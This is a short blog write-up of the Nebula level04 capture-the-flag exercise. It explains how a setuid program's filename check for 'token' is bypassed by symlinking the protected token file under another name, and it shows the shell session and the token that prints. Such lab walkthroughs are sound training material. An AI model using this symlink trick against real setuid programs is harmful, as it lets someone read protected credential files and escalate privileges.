---
layout: post
title: "Bypassed restriction"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 04](http://exploit-exercises.com/nebula/level04) Agenda**: "This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)"

<center>
	<img src="/images/2015-02-22-bypassed_restriction/reference.jpg">
</center>

<br />

After code review we can note that [strstr](http://www.tutorialspoint.com/c_standard_library/c_function_strstr.htm) makes check that filename which one we passed as input doesn't contain substring "*token*" or as result you'll get "*EXIT_FAILURE*" [status](http://www.gnu.org/software/libc/manual/html_node/Exit-Status.html). 

{% highlight sh linenos %}
level04@nebula:~$ cd /home/flag04
level04@nebula:/home/flag04$ ls -la
total 13
drwxr-x--- 2 flag04 level04   93 2011-11-20 21:52 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag04 flag04   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag04 flag04  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
-rw-r--r-- 1 flag04 flag04   675 2011-05-18 02:54 .profile
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token

level04@nebula:/home/flag04$ mkdir /tmp/level04
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04/flag
level04@nebula:/home/flag04$ ./flag04 /tmp/level04/flag

06508b5e-8909-4f38-b630-fdb148a848a2
{% endhighlight %}

 And finally, we can use the hash at line 16 as a passphrase for "*flag04*" user. After obtaining the access you should know what to do =)